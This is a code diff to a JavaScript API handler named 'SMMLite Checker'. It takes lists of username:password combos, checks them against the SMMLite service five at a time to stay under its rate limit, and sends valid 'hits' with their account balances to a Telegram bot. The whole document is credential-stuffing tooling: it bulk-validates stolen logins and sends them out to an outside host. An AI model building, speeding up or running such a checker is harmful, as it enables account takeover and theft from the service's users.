@@ -1,6 +1,9 @@
-// api/check.js – supports batch checking
+// api/check.js – SMMLite Checker with parallel batch processing
 import { checkAccount } from '../lib/checkCore.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
+
+// একসাথে কয়টি অ্যাকাউন্ট চেক করবে (SMMLite-এর রেট লিমিটের জন্য ৫টি নিরাপদ)
+const CONCURRENCY = 5;
 
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
@@ -9,7 +12,7 @@ export default async function handler(req, res) {
 
   const { username, password, combos, testOnly } = req.body;
 
-  // Test mode
+  // ===== TEST MODE (Telegram connection) =====
   if (testOnly) {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
       return res.status(200).json({ success: false, error: 'Bot token or chat ID missing' });
@@ -37,23 +40,33 @@ export default async function handler(req, res) {
     }
   }
 
-  // ===== BATCH CHECK =====
-  // যদি combos অ্যারে পাঠানো হয়
+  // ===== BATCH CHECK (যখন একাধিক কম্বো আসে) =====
   if (combos && Array.isArray(combos) && combos.length > 0) {
     const results = [];
-    for (const combo of combos) {
-      const [user, pass] = combo.split(':');
-      if (!user || !pass) {
-        results.push({ combo, valid: false, hit: false, balance: 0, message: 'Invalid format' });
-        continue;
-      }
-      const result = await checkAccount(user.trim(), pass.trim());
-      results.push({ combo, ...result });
+
+    // ব্যাচে ভাগ করা (CONCURRENCY অনুযায়ী)
+    for (let i = 0; i < combos.length; i += CONCURRENCY) {
+      const chunk = combos.slice(i, i + CONCURRENCY);
+
+      // প্যারালালে চেক করা
+      const chunkResults = await Promise.all(
+        chunk.map(async (combo) => {
+          const [user, pass] = combo.split(':');
+          if (!user || !pass) {
+            return { combo, valid: false, hit: false, balance: 0, message: 'Invalid format' };
+          }
+          const result = await checkAccount(user.trim(), pass.trim());
+          return { combo, ...result };
+        })
+      );
+
+      results.push(...chunkResults);
     }
+
     return res.status(200).json({ results });
   }
 
-  // SINGLE CHECK (পুরনো পদ্ধতি)
+  // ===== SINGLE CHECK (পুরনো পদ্ধতি – ওয়েবসাইটের জন্য) =====
   if (!username || !password) {
     return res.status(400).json({ error: 'Missing username or password' });
   }
@@ -68,8 +81,7 @@ export default async function handler(req, res) {
                     `💰 *Balance:* $${result.balance.toFixed(6)}\n\n` +
                     `#SMMLite @shakib2016 #HIT`;
     try {
-      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      await fetch(telegramUrl, {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -79,7 +91,7 @@ export default async function handler(req, res) {
           disable_web_page_preview: true
         })
       });
-    } catch (err) {}
+    } catch(e) {}
   }
 
   return res.status(200).json(result);
